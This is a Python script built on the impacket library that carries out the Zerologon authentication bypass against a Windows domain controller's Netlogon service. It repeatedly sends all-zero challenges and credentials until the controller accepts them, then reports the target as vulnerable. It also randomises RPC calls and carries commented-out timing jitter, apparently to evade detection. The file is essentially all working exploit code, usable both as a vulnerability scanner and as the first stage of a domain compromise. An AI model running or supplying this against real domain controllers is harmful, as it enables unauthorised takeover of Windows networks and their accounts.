
from __future__ import division
from __future__ import print_function
import random
import sys
import os
import time
from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.dcerpc.v5.dtypes import NULL

MAX_ATTEMPTS = 2000  # False negative chance: 0.04%

class ZEROLOGON:

    def __init__(self, dc_handle, username='', password='', domain='', target_computer='', dc_ip=None, test_type='' , privacy=True):
        self.__username = username
        self.__password = password
        self.__domain = domain.upper()
        self.__dc_handle = dc_handle
        self.__lmhash = ''
        self.__nthash = ''
        self.__kdcHost = dc_ip
        self.__test_type = test_type
        self.__privacy = privacy
        self.__target_computer = target_computer


    def try_zero_authenticate(self, dc_handle, dc_ip, target_computer,domain,user,password,test_type,privacy):
        # Connect to the DC's Netlogon service.
        if 'rpc' in test_type:
            binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
        else:
            binding = r'ncacn_np:%s[\PIPE\netlogon]' % dc_ip

        rpctransport = transport.DCERPCTransportFactory(binding)

        if 'smb' in test_type:
            if hasattr(rpctransport, 'set_credentials'):
                username = user
                if not username:
                    username = target_computer
                # This method exists only for selected protocol sequences.
                rpctransport.set_credentials(user, password, domain, '', '')

        dce = rpctransport.get_dce_rpc()
        
        # Bypass NetrServerAuthenticate3 client credential all 00
        if privacy:
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

        dce.connect()
        dce.bind(nrpc.MSRPC_UUID_NRPC)

        # Use an all-zero challenge and credential.

        finaly_rand_byte = os.urandom(1)

        plaintext = b'\x00' * 7 + finaly_rand_byte
        ciphertext = b'\x00' * 7 + finaly_rand_byte


        # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
        flags = 0x212fffff

        # Send challenge and authentication request.
        nrpc.hNetrServerReqChallenge(dce, dc_handle + '\x00', target_computer + '\x00', plaintext)
        #打乱时序
        random_sleep_time = random.uniform(0, 2)
        #time.sleep(random_sleep_time)
        try:

            query_level = 2
            server_auth = nrpc.hDsrGetDcNameEx(
                dce , NULL, NULL, NULL, NULL, 0
            )

            #两个rpc调用均可以
            random_number = random.randint(0, 1)

            if random_number == 0:
                server_auth = nrpc.hNetrServerAuthenticate2(
                    dce, dc_handle + '\x00', target_computer + '$\x00',
                    nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                            target_computer + '\x00', ciphertext, flags
                )
            else:
                server_auth = nrpc.hNetrServerAuthenticate3(
                    dce, dc_handle + '\x00', target_computer + '$\x00',
                    nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                            target_computer + '\x00', ciphertext, flags
                )

            # It worked!
            assert server_auth['ErrorCode'] == 0
            return dce

        except nrpc.DCERPCSessionError as ex:
            # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
            if ex.get_error_code() == 0xc0000022:
                return None
            else:
                print(f'Unexpected error code from DC: {ex.get_error_code()}.')
        except BaseException as ex:
            print(f'Unexpected error: {ex}.')

    
    #def perform_attack(dc_handle, dc_ip, target_computer,domain,user,password,test_type,privacy):
    def perform_attack(self):
    # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
        #print('Performing authentication attempts...')
        rpc_con = None
        for attempt in range(0, MAX_ATTEMPTS):
            rpc_con = self.try_zero_authenticate(self.__dc_handle, self.__kdcHost, self.__target_computer, self.__domain, self.__username, self.__password, self.__test_type, self.__privacy)
            
            #打乱时序
            random_sleep_time = random.uniform(1, 2)
            #time.sleep(random_sleep_time)
            if rpc_con == None:
                print('=', end='', flush=True)
            else:
                break

        if rpc_con:
            print('\n[+] Success! %s is Zerologon vul\n'% self.__kdcHost)
        else:
            print('\nAttack failed. Target is probably patched.\n')
            sys.exit(1)